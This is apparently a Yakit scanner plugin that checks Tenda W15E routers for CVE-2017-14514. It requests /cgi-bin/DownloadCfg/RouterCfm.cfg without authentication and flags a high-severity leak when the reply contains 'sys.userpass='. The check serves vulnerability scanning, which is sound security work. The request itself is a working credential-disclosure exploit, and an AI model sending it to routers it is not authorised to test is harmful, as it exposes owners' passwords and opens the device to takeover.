# port scan plugin
yakit.AutoInitYakit()
log.setLevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET /cgi-bin/DownloadCfg/RouterCfm.cfg HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0

`
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    hand, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
    drsp, derr = str.ParseBytesToHTTPResponse(rsp)

    // dump(rsp)
    if drsp.StatusCode == 200 && str.MatchAllOfRegexp(body, `sys\.userpass=.*`) {
        risk.NewRisk(
            addr,risk.title("tenda_w15e信息泄露(CVE-2017-14514)"),
            risk.severity("high"),
            risk.titleVerbose("tenda_w15e信息泄露(CVE-2017-14514)"),
            risk.type("info_leak"),
            risk.details({
                "target": addr,
                "request": req,
                "response": rsp,
            }),
        )
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    // dump(result.GetServiceName())
    // println("-------------------------------")
    // dump(result.GetCPEs())
    // println("-------------------------------")
    // dump(result.GetDomains())
    // println("-------------------------------")
    // dump(result.GetHtmlTitle())
    // println("-------------------------------")
    // dump(result.GetProto())

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
